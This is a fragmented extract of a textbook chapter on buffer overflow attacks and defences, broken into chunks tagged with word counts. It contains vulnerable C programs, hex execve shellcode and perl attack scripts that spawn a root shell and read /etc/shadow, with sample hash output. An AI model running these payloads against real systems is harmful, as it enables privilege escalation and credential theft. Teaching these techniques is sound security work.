Buffer Overrun: A condition at an interface under which more input can be 
placed into a buffer or data holding area than the capacity allocated, ­overwriting 
other information. Attackers exploit such a condition to crash a system or to 
insert ­specially crafted code that allows them to gain control of the system.
[Word Count: 52]

To illustrate the basic operation of a buffer overflow, consider the C main func-
tion given in Figure 10.1a. This contains three variables (valid, str1, and str2),1 
whose values will typically be saved in adjacent memory locations. The order and 
location of these will depend on the type of variable (local or global), the language 
and compiler used, and the target machine architecture. However, for the purpose 
of this example we will assume that they are saved in consecutive ­memory ­locations,
[Word Count: 81]

1In this example, the flag variable is saved as an integer rather than a Boolean. This is done both because 
it is the classic C style and to avoid issues of word alignment in its storage. The buffers are deliberately 
small to accentuate the buffer overflow issue being illustrated.
[Word Count: 49]

2Address and data values are specified in hexadecimal in this and related figures. Data values are also 
shown in ASCII where appropriate.
3In C the logical values FALSE and TRUE are simply integers with the values 0 and 1 (or indeed any 
nonzero value), respectively. Symbolic defines are often used to map these symbolic names to their un-
derlying value, as was done in this program.
4This and all subsequent examples in this chapter were created using an older Knoppix Linux system run-
ning on a Pentium processor, using the GNU GCC compiler and GDB debugger.
[Word Count: 96]

int valid = FALSE;
char str1[8];
char str2[8];
[Word Count: 8]

next_tag(str1);
gets(str2);
if (strncmp(str1,  str2, 8) == 0)
[Word Count: 8]

valid = TRUE;
printf("buffer1: str1(%s), str2(%s), valid(%d)\n", str1, str2, valid);
}
[Word Count: 11]

Figure 10.1  Basic Buffer Overflow Example
[Word Count: 6]

$ cc -g -o buffer1 buffer1.c
$ ./buffer1
START
buffer1: str1(START), str2(START), valid(1)
$ ./buffer1
EVILINPUTVALUE
buffer1: str1(TVALUE), str2(EVILINPUTVALUE), valid(0)
$ ./buffer1
BADINPUTBADINPUT
buffer1: str1(BADINPUT), str2(BADINPUTBADINPUT), valid(1)
[Word Count: 27]

c6bd0340
 . . . @
08fcffbf
 . . . .
00000000
 . . . .
80640140
 . d . @
54001540
 T . . @
53544152
 S T A R
00850408
 . . . .
30561540
[Word Count: 36]

After
gets(str2)
Before
gets(str2)
Memory
Address
[Word Count: 6]

c6bd0340
 . . . @
08fcffbf
 . . . .
01000000
 . . . .
00640140
 . d . @
4e505554
 N P U T
42414449
 B A D I
4e505554
 N P U T
42414449
 B A D I
[Word Count: 40]

Figure 10.2  Basic Buffer Overflow Stack Values
[Word Count: 7]

5The newline (NL) or linefeed (LF) character is the standard end of line terminator for UNIX systems, 
and hence for C, and is the character with the ASCII value 0x0a.
6Strings in C are stored in an array of characters and terminated with the NULL character, which has the 
ASCII value 0x00. Any remaining locations in the array are undefined, and typically contain whatever 
value was previously saved in that area of memory. This can be clearly seen in the value in the variable 
str2 in the “Before” column of Figure 10.2.
[Word Count: 92]

To exploit any type of buffer overflow, such as those we have illustrated here, 
the attacker needs:
[Word Count: 17]

1.	 To identify a buffer overflow vulnerability in some program that can be
[Word Count: 13]

­triggered using externally sourced data under the attackers control, and
	
2.	 To understand how that buffer will be stored in the processes memory, and
[Word Count: 24]

hence the potential for corrupting adjacent memory locations and potentially 
altering the flow of execution of the program.
[Word Count: 18]

Identifying vulnerable programs may be done by inspection of program 
source, tracing the execution of programs as they process oversized input, or using 
tools such as fuzzing, which we discuss in Section 11.2, to automatically identify 
potentially vulnerable programs. What the attacker does with the resulting corrup-
tion of memory varies considerably, depending on what values are being overwrit-
ten. We will explore some of the alternatives in the following sections.
[Word Count: 71]

use of assembly (and hence machine) language programs gives the greatest access 
to the resources of the computer system, but at the highest cost and responsibility in 
coding effort for the programmer.
[Word Count: 32]

in the chapter introduction, stack buffer overflows are still being exploited, as new 
vulnerabilities continue to be discovered in widely deployed software.
[Word Count: 22]

1.	 Pushes the parameters for the called function onto the stack (typically in
[Word Count: 13]

­reverse order of declaration).
	
2.	 Executes the call instruction to call the target function, which pushes the
[Word Count: 17]

7Though early programming languages like Fortran did not do this, and as a consequence Fortran func-
tions could not be called recursively.
[Word Count: 22]

Figure 10.3  Example Stack Frame with Functions P and Q
[Word Count: 10]

3.	 Pushes the current frame pointer value (which points to the calling routine’s
[Word Count: 13]

stack frame) onto the stack.
	
4.	 Sets the frame pointer to be the current stack pointer value (that is the address
[Word Count: 21]

of the old frame pointer), which now identifies the new stack frame location 
for the called function.
	
5.	 Allocates space for local variables by moving the stack pointer down to leave
[Word Count: 31]

sufficient room for them.
	
6.	 Runs the body of the called function.
	
7.	 As it exits it first sets the stack pointer back to the value of the frame pointer
[Word Count: 30]

(effectively discarding the space used by local variables).
	
8.	 Pops the old frame pointer value (restoring the link to the calling routine’s
[Word Count: 22]

stack frame).
	
9.	 Executes the return instruction which pops the saved address off the stack and
[Word Count: 16]

returns control to the calling function.
[Word Count: 6]

10.	 Pops the parameters for the called function off the stack.
	 11.	 Continues execution with the instruction following the function call.
[Word Count: 21]

At this point, it is useful to step back and take a somewhat wider view of 
a ­running program, and the placement of key regions such as the program code, 
­global data, heap and stack. When a program is run, the operating system typically 
creates a new process for it. The process is given its own virtual address space, with 
a ­general structure as shown in Figure 10.4. This consists of the contents of the 
­executable program file (including global data, relocation table, and actual program
[Word Count: 86]

code ­segments) near the bottom of this address space, space for the program heap 
to then grow upward from above the code, and room for the stack to grow down 
from near the middle (if room is reserved for kernel space in the upper half) or top. 
The stack frames we discussed are hence placed one below another in the stack 
area, as the stack grows downward through memory. We return to discuss some 
of the other components later. Further details on the layout of a processes address 
space may be found in [STAL14c].
[Word Count: 94]

To illustrate the operation of a classic stack overflow, consider the C func-
tion given in Figure 10.5a. It contains a single local variable, the buffer inp. This 
is saved in the stack frame for this function, located somewhere below the saved 
frame pointer and return address, as shown in Figure 10.6. This hello function
[Word Count: 55]

Figure 10.4  Program Loading into Process Memory
[Word Count: 7]

printf("Enter value for %s: ", tag);
gets(inp);
printf("Hello your %s is %s\n", tag, inp);
}
[Word Count: 15]

Figure 10.5  Basic Stack Overflow Example
[Word Count: 6]

$ ./buffer2
Enter value for name: Bill and Lawrie
Hello your name is Bill and Lawrie
buffer2 done
[Word Count: 18]

$ ./buffer2
Enter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Segmentation fault (core dumped)
[Word Count: 11]

$ perl -e 'print pack("H*", "414243444546474851525354555657586162636465666768
08fcffbf948304080a4e4e4e4e0a");' | ./buffer2
Enter value for name:
Hello your Re?pyy]uEA is ABCDEFGHQRSTUVWXabcdefguyu
Enter value for Kyyu:
Hello your Kyyu is NNNN
Segmentation fault (core dumped)
[Word Count: 31]

And since the program has crashed, it can no longer supply the function or service 
it was running for. At its simplest, then, a stack overflow can result in some form of 
denial-of-service attack on a system.
[Word Count: 37]

Of more interest to the attacker, rather than immediately crashing the pro-
gram, is to have it transfer control to a location and code of the attacker’s choosing. 
The simplest way of doing this is for the input causing the buffer overflow to con-
tain the desired target address at the point where it will overwrite the saved return 
address in the stack frame. Then when the attacked function finishes and executes 
the return instruction, instead of returning to the calling function, it will jump to the 
supplied address instead and execute instructions from there.
[Word Count: 95]

e8fbffbf
 . . . .
60840408
 ` . . .
30561540
 0 V . @
1b840408
 . . . .
e8fbffbf
 . . . .
3cfcffbf
 < . . .
34fcffbf
 4 . . .
[Word Count: 35]

After
gets(inp)
Before
gets(inp)
Memory
Address
[Word Count: 6]

e8ffffbf
 . . . .
65666768
 e f g h
61626364
 a b c d
55565758
 U V W X
51525354
 Q R S T
45464748
 E F G H
41424344
 A B C D
[Word Count: 35]

Figure 10.6  Basic Stack Overflow Stack Values
[Word Count: 7]

The attack process is further illustrated in Figure 10.6, which shows the val-
ues of the stack frame, including the local buffer inp before and after the call to 
gets(). Looking at the stack frame before this call, we see that the buffer inp
[Word Count: 44]

8Perl—the Practical Extraction and Report Language—is a very widely used interpreted scripting lan-
guage. It is usually installed by default on UNIX, Linux, and derivative systems and is available for most 
other operating systems.
[Word Count: 34]

contains ­garbage values, being whatever was in memory before. The saved frame 
pointer value is 0xbffffbe8, and the return address is 0x080483f0. After the 
gets() call, the buffer inp contained the string of letters specified above, the saved 
frame pointer became 0xbfffffe8, and the return address was 0x08048394, 
exactly as we specified in our attack string. Note also how the bottom byte of the 
tag parameter was corrupted, by being changed to 0x00, the trailing NULL char-
acter mentioned previously. Clearly the attack worked as designed.
[Word Count: 86]

puts("Input value: ");
fgets(inp, siz, stdin);
printf("buffer3 getinp read %s\n", inp);
}
[Word Count: 12]

char tmp[16];
sprintf(tmp, "read val: %s\n", val);
puts(tmp);
}
[Word Count: 9]

char buf[16];
getinp (buf, sizeof (buf));
display(buf);
printf("buffer3 done\n");
}
[Word Count: 10]

Figure 10.7  Another Stack Overflow Example
[Word Count: 6]

$ ./buffer3
Input value:
SAFE
buffer3 getinp read SAFE
read val: SAFE
buffer3 done
[Word Count: 14]

$ ./buffer3
Input value:
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
buffer3 getinp read XXXXXXXXXXXXXXX
read val: XXXXXXXXXXXXXXX
[Word Count: 12]

buffer3 done
Segmentation fault (core dumped)
[Word Count: 6]

are being merged into a buffer that includes the contents of another buffer, such 
that the space needed exceeds the space available. Look at the example runs of this 
program shown in Figure 10.7b. For the first run, the value read is small enough 
that the merged response did not corrupt the stack frame. For the second run, the 
supplied input was much too large. However, because a safe input function was
[Word Count: 72]

Table 10.2  Some Common Unsafe C Standard Library Routines
[Word Count: 9]

gets(char *str)
read line from standard input into str
[Word Count: 9]

sprintf(char *str, char *format, . . .)
create str according to supplied format and variables
[Word Count: 15]

strcat(char *dest, char *src)
append contents of string src to string dest
[Word Count: 12]

strcpy(char *dest, char *src)
copy contents of string src to string dest
[Word Count: 12]

vsprintf(char *str, char *fmt, va_list ap)
create str according to supplied format and variables
[Word Count: 14]

9There are other unsafe routines that may be commonly used, including a number that are OS specific. 
Microsoft maintains a list of unsafe Windows library calls; the list should be consulted if programming for 
Windows systems [HOWA07].
[Word Count: 37]

There are also several generic restrictions on the content of shellcode. First, it 
has to be position independent. That means it cannot contain any absolute address 
referring to itself, because the attacker generally cannot determine in advance exactly
[Word Count: 38]

sh = "/bin/sh;
args[0] = sh;
args[1] = NULL;
execve (sh, args, NULL);
}
[Word Count: 14]

(b) Equivalent position-independent x86 assembly code
[Word Count: 6]

90  90  eb  1a  5e  31  c0  88  46  07  8d  1e  89  5e  08  89
46  0c  b0  0b  89  f3  8d  4e  08  8d  56  0c  cd  80  e8  e1
ff  ff  ff  2f  62  69  6e  2f  73  68  20  20  20  20  20  20
[Word Count: 48]

(c) Hexadecimal values for compiled x86 machine code
[Word Count: 8]

values using the stack before it is finally called. So while the attacker may have an 
approximate idea of the location of the stack frame, it usually cannot be determined 
precisely. All of this means that the shellcode must be able to run no matter where in 
memory it is located. This means that only relative address references, offsets to the 
current instruction address, can be used. It also means that the attacker is not able to 
precisely specify the starting address of the instructions in the shellcode.
[Word Count: 88]

Another restriction on shellcode is that it cannot contain any NULL values. 
This is a consequence of how it is typically copied into the buffer in the first place. 
All the examples of buffer overflows we use in this chapter involve using unsafe 
string manipulation routines. In C, a string is always terminated with a NULL char-
acter, which means the only place the shellcode can have a NULL is at the end, after 
all the code, overwritten old frame pointer, and return address values.
[Word Count: 85]

Table 10.3  Some Common x86 Assembly Language Instructions
[Word Count: 8]

MOV src, dest
copy (move) value from src into dest
[Word Count: 10]

LEA src, dest
copy the address (load effective address) of src into dest
[Word Count: 13]

ADD / SUB src, dest
add / sub value in src from dest leaving result in dest
[Word Count: 17]

AND / OR / XOR src, dest
logical and / or / xor value in src with dest leaving result in dest
[Word Count: 22]

CMP val1, val2
compare val1 and val2, setting CPU flags as a result
[Word Count: 13]

JMP / JZ / JNZ addr
jump / if zero / if not zero to addr
[Word Count: 16]

PUSH src
push the value in src onto the stack
[Word Count: 10]

POP dest
pop the value on the top of the stack into dest
[Word Count: 13]

LEAVE
clean up stack frame before leaving function
[Word Count: 8]

INT num
software interrupt to access operating system function
[Word Count: 9]

NOP
no operation or do nothing instruction
[Word Count: 7]

10There are two conventions for writing x86 assembly language: Intel and AT&T. Among other differ-
ences, they use opposing orders for the operands. All of the examples in this chapter use the AT&T 
convention, because that is what the GNU GCC compiler tools, used to create these examples, accept 
and generate.
11These machine registers are all now 32 bits long. However, some can also be used as a 16-bit register 
(being the lower half of the register) or 8-bit registers (relative to the 16-bit version) if needed.
[Word Count: 87]

The next issue is ensuring that no NULLs occur in the shellcode. This means 
a zero value cannot be used in any instruction argument or in any constant data 
(such as the terminating NULL on the end of the ”/bin/sh” string). Instead, any 
required zero values must be generated and saved as the code runs. The logical 
XOR instruction of a register value with itself generates a zero value, as is done 
here with the %eax register. This value can then be copied anywhere needed, such 
as the end of the string, and also as the value of args[1].
[Word Count: 99]

To deal with the inability to precisely determine the starting address of this 
code, the attacker can exploit the fact that the code is often much smaller than the 
space available in the buffer (just 40 bytes long in this example). By the placing the 
code near the end of the buffer, the attacker can pad the space before it with NOP 
instructions. Because these instructions do nothing, the attacker can specify the 
return address used to enter this code as a location somewhere in this run of NOPs,
[Word Count: 89]

%eax
%ax
%ah
%al
Accumulators used for arithmetical and I/O operations and execute 
interrupt calls
[Word Count: 15]

%ebx
%bx
%bh
%bl
Base registers used to access memory, pass system call arguments 
and return values
[Word Count: 17]

%edx
%dx
%dh
%dl
Data registers used for arithmetic operations, interrupt calls and IO 
operations
[Word Count: 15]

%ebp
Base Pointer containing the address of the current stack frame
[Word Count: 11]

%eip
Instruction Pointer or Program Counter containing the address of 
the next instruction to be executed
[Word Count: 16]

%esi
Source Index register used as a pointer for string or array operations
[Word Count: 13]

%esp
Stack Pointer containing the address of the top of stack
[Word Count: 11]

which is called a NOP sled. If the specified address is approximately in the middle of 
the NOP sled, the attacker’s guess can differ from the actual buffer address by half 
the size of the NOP sled, and the attack will still succeed. No matter where in the 
NOP sled the actual target address is, the computer will run through the remaining 
NOPs, doing nothing, until it reaches the start of the real shellcode.
[Word Count: 74]

With this background, you should now be able to trace through the resulting 
assembler shellcode listed in Figure 10.8b. In brief, this code:
[Word Count: 23]

• Determines the address of the constant string using the JMP/CALL trick
 
• Zeroes the contents of %eax and copies this value to the end of the constant
[Word Count: 28]

string
 
• Saves the address of that string in args[0]
 
• Zeroes the value of args[1]
 
• Marshals the arguments for the system call being
[Word Count: 25]

—The code number for the execve system call (11)
—The address of the string as the name of the program to load
—The address of the args array as its argument list
—The address of args[1], because it is NULL, as the (empty) environment list
[Word Count: 45]

• Generates a software interrupt to execute this system call (which never returns)
[Word Count: 13]

When this code is assembled, the resulting machine code is shown in hexadecimal in 
Figure 10.8c. This includes a couple of NOP instructions at the front (which can be 
made as long as needed for the NOP sled), and ASCII spaces instead of zero values 
for the local variables at the end (because NULLs cannot be used, and because the 
code will write the required values in when it runs). This shellcode forms the core of 
the attack string, which must now be adapted for some specific vulnerable program.
[Word Count: 89]

The attacker must also specify the commands to be run by the shell once the 
attack succeeds. These also must be written to the target program, as the spawned 
Bourne shell will be reading from the same standard input as the program it replaces. 
In this example, we will run two UNIX commands:
[Word Count: 53]

1.	 whoami displays the identity of the user whose privileges are currently being
[Word Count: 13]

used.
	
2.	 cat/etc/shadow displays the contents of the shadow password file, holding
[Word Count: 12]

the user’s encrypted passwords, which only the superuser has access to.
[Word Count: 11]

$ dir -l buffer4
-rwsr-xr-x      1 root        knoppix          16571 Jul 17 10:49 buffer4
[Word Count: 13]

$ whoami
knoppix
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
[Word Count: 10]

$ cat attack1
perl -e 'print pack("H*",
"90909090909090909090909090909090" .
"90909090909090909090909090909090" .
"9090eb1a5e31c08846078d1e895e0889" .
"460cb00b89f38d4e088d560ccd80e8e1" .
"ffffff2f62696e2f7368202020202020" .
"202020202020202038fcffbfc0fbffbf0a");
print "whoami\n";
print "cat /etc/shadow\n";'
[Word Count: 23]

$ attack1 | buffer4
Enter value for name: Hello your yyy)DA0Apy is e?^1AFF. . ./bin/sh. . .
root
root:$1$rNLId4rX$nka7JlxH7.4UJT4l9JRLk1:13346:0:99999:7:::
daemon:*:11453:0:99999:7:::
. . .
nobody:*:11453:0:99999:7:::
knoppix:$1$FvZSBKBu$EdSFvuuJdKaCH8Y0IdnAv/:13346:0:99999:7:::
. . .
[Word Count: 28]

Figure 10.9  Example Stack Overflow Attack
[Word Count: 6]

10.2 / Defending Against Buffer Overflows   359
[Word Count: 7]

possibly receive additional commands to execute. All of this shows that buffer over-
flows can be found in a wide variety of programs, processing a range of different 
input, and with a variety of possible responses.
[Word Count: 36]

The preceding descriptions illustrate how simple shellcode can be developed 
and deployed in a stack overflow attack. Apart from just spawning a command-
line (UNIX or DOS) shell, the attacker might want to create shellcode to perform 
somewhat more complex operations, as indicated in the case just discussed. The 
Metasploit Project site includes a range of functionality in the shellcode it can 
generate, and the Packet Storm Web site includes a large collection of packaged 
­shellcode, including code that can:
[Word Count: 80]

• Set up a listening service to launch a remote shell when connected to.
 
• Create a reverse shell that connects back to the hacker.
 
• Use local exploits that establish a shell or execve a process.
 
• Flush firewall rules (such as IPTables and IPChains) that currently block other
[Word Count: 50]

attacks.
 
• Break out of a chrooted (restricted execution) environment, giving full access
[Word Count: 13]

Considerably greater detail on the process of writing shellcode for a variety of plat-
forms, with a range of possible results, can be found in [ANLE07].
[Word Count: 26]

We have seen that finding and exploiting a stack buffer overflow is not that dif-
ficult. The large number of exploits over the previous couple of decades clearly 
illustrates this. There is consequently a need to defend systems against such attacks 
by either preventing them, or at least detecting and aborting such attacks. This sec-
tion ­discusses possible approaches to implementing such protections. These can be 
broadly classified into two categories:
[Word Count: 71]

• Compile-time defenses, which aim to harden programs to resist attacks in new
[Word Count: 13]

programs.
 
• Run-time defenses, which aim to detect and abort attacks in existing
[Word Count: 13]

While suitable defenses have been known for a couple of decades, the very large 
existing base of vulnerable software and systems hinders their deployment. Hence 
the interest in run-time defenses, which can be deployed as operating systems and 
updates and can provide some protection for existing vulnerable programs. Most of 
these techniques are mentioned in [LHCEE03].
[Word Count: 56]

Compile-time defenses aim to prevent or detect buffer overflows by ­instrumenting 
programs when they are compiled. The possibilities for doing this range from 
­choosing a high-level language that does not permit buffer overflows, to ­encouraging
[Word Count: 35]

safe coding standards, using safe standard libraries, or including additional code to 
detect corruption of the stack frame.
[Word Count: 18]

Unfortunately, as several decades of experience has shown, this has not been 
the case. This may be seen in large legacy body of potentially unsafe code in the 
Linux, UNIX, and Windows operating systems and applications, some of which are 
potentially vulnerable to buffer overflows.
[Word Count: 45]

10.2 / Defending Against Buffer Overflows   361
[Word Count: 7]

including many buffer overflow issues, that have been found in their operating sys-
tems and applications code. This has clearly been a difficult process, though they 
claim that their more recent Vista and later Windows operating systems benefit 
greatly from this process.
[Word Count: 42]

int copy_buf(char *to, int pos, char *from, int len)
{
[Word Count: 10]

for (i=0; i<len; i++) {
     to[pos] = from[i];
     pos++;
}
return pos;
}
[Word Count: 13]

short len;
fread(&len, 2, 1, fil);        /* read length of binary data */
fread(to, 1, len, fil);        /* read len bytes of binary data
return len;
}
[Word Count: 27]

Stack Protection Mechanisms  An effective method for protecting programs 
against classic stack overflow attacks is to instrument the function entry and exit 
code to setup and then check its stack frame for any evidence of corruption. If 
any modification is found, the program is aborted rather than allowing the attack 
to proceed. There are several approaches to providing this protection, which we 
discuss next.
[Word Count: 64]

10.2 / Defending Against Buffer Overflows   363
[Word Count: 7]

There are some issues with using this approach. First, it requires that all pro-
grams needing protection be recompiled. Second, because the structure of the stack 
frame has changed, it can cause problems with programs, such as debuggers, which 
analyze stack frames. However, the canary technique has been used to recompile an 
entire Linux distribution and provide it with a high level of resistance to stack over-
flow attacks. Similar functionality is available for Windows programs by compiling 
them using Microsoft’s /GS Visual C++ compiler option.
[Word Count: 86]

As has been noted, most of the compile-time approaches require recompilation of 
existing programs. Hence there is interest in run-time defenses that can be deployed 
as operating systems updates to provide some protection for existing vulnerable 
programs. These defenses involve changes to the memory management of the vir-
tual address space of processes. These changes act to either alter the properties of 
regions of memory, or to make predicting the location of targeted buffers suffi-
ciently difficult to thwart many types of attacks.
[Word Count: 83]

Executable Address Space Protection  Many of the buffer overflow attacks, 
such as the stack overflow examples in this chapter, involve copying machine code
[Word Count: 23]

12Named after the miner’s canary used to detect poisonous air in a mine and thus warn the miners in time 
for them to escape.
[Word Count: 24]

into the targeted buffer and then transferring execution to it. A possible defense is 
to block the execution of code on the stack, on the assumption that executable code 
should only be found elsewhere in the processes address space.
[Word Count: 39]

Related to this approach is the use of random dynamic memory allocation (for 
malloc() and related library routines). As we discuss in Section 10.3, there is a 
class of heap buffer overflow attacks that exploit the expected proximity of succes-
sive memory allocations, or indeed the arrangement of the heap management data 
structures. Randomizing the allocation of memory on the heap makes the possibil-
ity of predicting the address of targeted buffers extremely difficult, thus thwarting 
the successful execution of some heap overflow attacks.
[Word Count: 84]

10.3 / Other Forms of Overflow Attacks   365
[Word Count: 8]

Another target of attack is the location of standard library routines. In an 
attempt to bypass protections such as nonexecutable stacks, some buffer overflow 
variants exploit existing code in standard libraries. These are typically loaded at 
the same address by the same program. To counter this form of attack, we can use 
a security extension that randomizes the order of loading standard libraries by a 
program and their virtual memory address locations. This makes the address of any 
specific function sufficiently unpredictable as to render the chance of a given attack 
correctly predicting its address, very low.
[Word Count: 97]

The OpenBSD system includes versions of all of these extensions in its tech-
nological support for a secure system.
[Word Count: 19]

A further extension places guard pages between stack frames or between dif-
ferent allocations on the heap. This can provide further protection against stack and 
heap over flow attacks, but at cost in execution time supporting the large number of 
page mappings necessary.
[Word Count: 43]

In this section, we discuss at some of the other buffer overflow attacks that have 
been exploited and consider possible defenses. These include variations on stack 
overflows, such as return to system call, overflows of data saved in the program 
heap, and overflow of data saved in the processes global data section. A more 
detailed survey of the range of possible attacks may be found in [LHEE03].
[Word Count: 67]

Defenses against this type of attack include any of the stack protection mech-
anisms to detect modifications to the stack frame or return address by function 
exit code. Also, using nonexecutable stacks blocks the execution of the shellcode, 
although this alone would not prevent an indirect variant of the return-to-system-
call attack we will consider next. Randomization of the stack in memory and of 
­system libraries would both act to greatly hinder the ability of the attacker to guess 
the correct addresses to use and hence block successful execution of the attack.
[Word Count: 92]

Given the introduction of nonexecutable stacks as a defense against buffer 
­overflows, attackers have turned to a variant attack in which the return address
[Word Count: 24]

13Note that while this is not the case with the GCC compiler used for the examples in this chapter, it is a 
common arrangement with many other compilers.
[Word Count: 28]

10.3 / Other Forms of Overflow Attacks   367
[Word Count: 8]

Again, defenses against this include any of the stack protection mechanisms to 
detect modifications to the stack frame or return address by the function exit code. 
Likewise, randomization of the stack in memory, and of system libraries, hinders 
successful execution of such attacks.
[Word Count: 43]

As an example, consider the program code shown in Figure 10.11a. This 
declares a structure containing a buffer and a function pointer.14 Consider the 
lines of code shown in the main() routine. This uses the standard malloc() 
library function to allocate space for a new instance of the structure on the heap 
and then places a reference to the function showlen() in its function pointer to 
process the buffer. Again, the unsafe gets() library routine is used to illustrate 
an unsafe buffer copy. Following this, the function pointer is invoked to process  
the buffer.
[Word Count: 94]

Defenses against heap overflows include making the heap also nonexecutable. 
This will block the execution of code written into the heap. However, a variant of 
the return-to-system call is still possible. Randomizing the allocation of memory 
on the heap makes the possibility of predicting the address of targeted buffers
[Word Count: 49]

14Realistically, such a structure would have more fields, including flags and pointers to other such struc-
tures so they can be linked together. However, the basic attack we discuss here, with minor modifications, 
would still work.
[Word Count: 36]

10.3 / Other Forms of Overflow Attacks   369
[Word Count: 8]

/* record type to allocate on heap */
typedef struct chunk {
[Word Count: 12]

char inp[64];              /* vulnerable input buffer */
void (*process)(char *); /* pointer to function to process inp */
} chunk_t;
[Word Count: 20]

int len;
len = strlen(buf);
printf("buffer5 read %d chars\n", len);
}
[Word Count: 11]

setbuf(stdin, NULL);
next = malloc(sizeof(chunk_t));
next->process = showlen;
printf("Enter value: ");
gets(next->inp);
next->process(next->inp);
printf("buffer5 done\n");
}
[Word Count: 16]

Figure 10.11  Example Heap Overflow Attack
[Word Count: 6]

$ cat attack2
#!/bin/sh
# implement heap overflow against program buffer5
perl -e 'print pack("H*",
"90909090909090909090909090909090" .
"9090eb1a5e31c08846078d1e895e0889" .
"460cb00b89f38d4e088d560ccd80e8e1" .
"ffffff2f62696e2f7368202020202020" .
"b89704080a");
print "whoami\n";
print "cat /etc/shadow\n";'
[Word Count: 29]

$ attack2 | buffer5
Enter value:
root
root:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::
daemon:*:11453:0:99999:7:::
. . .
nobody:*:11453:0:99999:7:::
knoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::
. . .
[Word Count: 17]

extremely difficult, thus thwarting the successful execution of some heap overflow 
attacks. Additionally, if the memory allocator and deallocator include checks for 
corruption of the management data, they could detect and abort any attempts to 
overflow outside an allocated area of memory.
[Word Count: 42]

A final category of buffer overflows we consider involves buffers located in the 
program’s global (or static) data area. Figure 10.4 showed that this is loaded from 
the program file and located in memory above the program code. Again, if unsafe 
­buffer operations are used, data may overflow a global buffer and change adjacent 
memory locations, including perhaps one with a function pointer, which is then 
­subsequently called.
[Word Count: 68]

Figure 10.12a illustrates such a vulnerable program (which shares many simi-
larities with Figure 10.11a, except that the structure is declared as a global variable). 
The design of the attack is very similar; indeed only the target address changes. The 
global structure was found to be at address 0x08049740, which was used as the 
target address in the attack. Note that global variables do not usually change loca-
tion, as their addresses are used directly in the program code. The attack script and 
result of successfully executing it are shown in Figure 10.12b.
[Word Count: 93]

More complex variations of this attack exploit the fact that the process address 
space may contain other management tables in regions adjacent to the global data 
area. Such tables can include references to destructor functions (a GCC C and C++ 
extension), a global-offsets table (used to resolve function references to dynamic 
libraries once they have been loaded), and other structures. Again, the aim of the 
attack is to overwrite some function pointer that the attacker believes will then 
be called later by the attacked program, transferring control to shellcode of the 
attacker’s choice.
[Word Count: 93]

Defenses against such attacks include making the global data area nonexecut-
able, arranging function pointers to be located below any other types of data, and 
using guard pages between the global data area and any other management areas.
[Word Count: 38]

Beyond the types of buffer vulnerabilities we have discussed here, there are still 
more variants including format string overflows and integer overflows. It is likely that 
even more will be discovered in future. The references given the in Recommended 
Reading for this chapter include details of additional variants. In particular, details 
of a range of buffer overflow attacks are discussed in [LHEE03] and [VEEN12].
[Word Count: 64]

The important message is that if programs are not correctly coded in the first 
place to protect their data structures, then attacks on them are possible. While 
the defenses we have discussed can block many such attacks, some, like the original 
example in Figure 10.1 (which corrupts an adjacent variable value in a manner that 
alters the behavior of the attacked program), simply cannot be blocked except by 
coding to prevent them.
[Word Count: 72]

10.3 / Other Forms of Overflow Attacks   371
[Word Count: 8]

/* global static data - will be targeted for attack */
struct chunk {
[Word Count: 14]

char inp[64];          /* input buffer */
void (*process)(char *); /* pointer to function to process it */
} chunk;
[Word Count: 19]

int len;
len = strlen(buf);
printf("buffer6 read %d chars\n", len);
}
[Word Count: 11]

setbuf(stdin, NULL);
chunk.process = showlen;
printf("Enter value: ");
gets(chunk.inp);
chunk.process(chunk.inp);
printf("buffer6 done\n");
}
[Word Count: 13]

Figure 10.12  Example Global Data Overflow Attack
[Word Count: 7]

(a) Vulnerable global data overflow C code
[Word Count: 7]

$ cat attack3
#!/bin/sh
# implement global data overflow attack against program buffer6
perl -e 'print pack("H*",
"90909090909090909090909090909090" .
"9090eb1a5e31c08846078d1e895e0889" .
"460cb00b89f38d4e088d560ccd80e8e1" .
"ffffff2f62696e2f7368202020202020" .
"409704080a");
print "whoami\n";
print "cat /etc/shadow\n";'
[Word Count: 31]

$ attack3 | buffer6
Enter value:
root
root:$1$4oInmych$T3BVS2E3OyNRGjGUzF4o3/:13347:0:99999:7:::
daemon:*:11453:0:99999:7:::
. . . .
nobody:*:11453:0:99999:7:::
knoppix:$1$p2wziIML$/yVHPQuw5kvlUFJs3b9aj/:13347:0:99999:7:::
. . . .
[Word Count: 19]

[LHEE03] surveys a range of alternative buffer overflow techniques, including a 
number not mentioned in this chapter, along with possible defensive techniques. 
Considerably greater detail on specific aspects is given in [HOGL04] and [ANLE07]. 
The original published description of buffer overflow attacks is given in [LEVY96]. 
[KUPE05] and [VEEN12] provide broad overviews of this topic. For much greater 
detail on the basic organization and operation of computer systems, including 
details on stack frames and process organization conventions, see [STAL13], or for 
process and operating systems details, see [STAL14c].
[Word Count: 88]

ANLE07   Anley, C.; Heasman, J.; Lindner, F.; and Richarte, G. The Shellcoder’s
[Word Count: 12]

Handbook: Discovering and Exploiting Security Holes, Second Edition. 
Hoboken, NJ: John Wiley & Sons, 2007.
HOGL04  Hoglund, G., and McGraw, G. Exploiting Software: How to Break Code.
[Word Count: 27]

Reading, MA: Addison-Wesley, 2004.
KUPE05    Kuperman, B., et al. “Detection and Prevention of Stack Buffer Overflow
[Word Count: 16]

Attacks.” Communications of the ACM, November 2005.
LEVY96    Levy, E. “Smashing The Stack For Fun And Profit.” Phrack Magazine, file
[Word Count: 20]

14, Issue 49, November 1996.
LHEE03    Lhee, K., and Chapin, S. “Buffer Overflow and Format String Overflow
[Word Count: 17]

Vulnerabilities.” Software—Practice and Experience, Volume 33, 2003.
STAL13    Stallings, W. Computer Organization and Architecture: Designing for
[Word Count: 16]

Performance, Ninth Edition. Upper Saddle River, NJ: Pearson, 2013.
STAL14c  Stallings, W. Operating Systems: Internals and Design Principles, Seventh
[Word Count: 19]

Edition. Upper Saddle River, NJ: Pearson, 2014.
VEEN12  van der Veen, V.; dutt-Sharma, N.; Cavallaro, L., and Bos, H. “Memory
[Word Count: 20]

errors: the past, the present, and the future.” in Proceedings of the 15th 
international conference on Research in Attacks, Intrusions, and Defenses 
(RAID’12), Springer-Verlag, pp. 86–106, 2012.
[Word Count: 27]

10.5	Key Terms, Review Questions, and Problems
[Word Count: 7]

address space
buffer
buffer overflow
buffer overrun
guard page
heap
